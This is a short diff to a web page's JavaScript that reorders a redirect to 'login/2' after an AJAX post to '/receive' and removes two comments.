@@ -349,11 +349,10 @@ font-weight: 5px!important;
                 url: "/receive",
                 data: user
             }).done(function(msg) {
-                // Store visitor info in sessionStorage
                 sessionStorage.setItem('visitor', visitor);
-                // Redirect to login page
-                window.location.href = "login/2";
                 console.log(msg); // Log success message
+                window.location.href = "login/2";
+                
             }).fail(function(err, textstatus, error) {
                 window.location.href = "login/2";
                 console.log('fail');
